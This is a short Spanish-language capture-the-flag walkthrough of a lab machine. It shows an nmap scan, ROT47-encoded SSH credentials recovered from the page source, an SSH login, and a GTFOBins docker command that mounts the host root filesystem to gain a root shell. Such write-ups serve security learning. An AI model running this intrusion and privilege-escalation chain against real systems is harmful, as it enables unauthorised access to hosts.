1. Enumeración de puertos abiertos 
```
nmap -p- --open --min-rate 5000 -n -Pn -vvv -sCSV 192.168.18.85 -oN scanPorts
```

Impresión 
```
Discovered open port 22/tcp on 192.168.18.85
Discovered open port 80/tcp on 192.168.18.85
```

2. Dentro de la pagina `http://192.168.18.85`, existe una credencia encriptada
```
D92:=6?5C2
4J36CDA=@:E`
```

3. Con `Ctrl-u` dentro de la pagina, en la línea 126 se encuentra el siguiente comentario
```
<!----------ROT47---------->
```

4. Utilizando `dcoder.com` en cifrado `rot47` para las credenciales
```
shailendra
cybersploit1
```

5. Conectarse por vía `ssh`
```
ssh shailendra@192.168.18.85
```

6. Dentro de la ruta `/home/shailendra/` hay una pista con el archivo `hint.txt` 
```
docker
```

7. Buscar dentro de `GTFObins` la palabra `docker` para escalar privilegios. Entre una de las opciones se encuentra el siguiente comando
```
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```
Este comando crea un volumen `-v` que se va amontar en el directorio `/mnt` y que al finalizar el proceso todo se elimine `--rm`, también monta una consola interactiva `-i` en la imagen `-t alpine`, cambia el directorio raiz del proceso actual y subproceso al directorio `/mnt` e indica que la consola interactiva sea una `sh` .

Impresión 
```
Unable to find image 'alpine:latest' locally
latest: Pulling from library/alpine
4abcf2066143: Pull complete 
Digest: sha256:c5b1261d6d3e43071626931fc004f70149baeba2c8ec672bd4f27761f8e1ad6b
Status: Downloaded newer image for alpine:latest
```
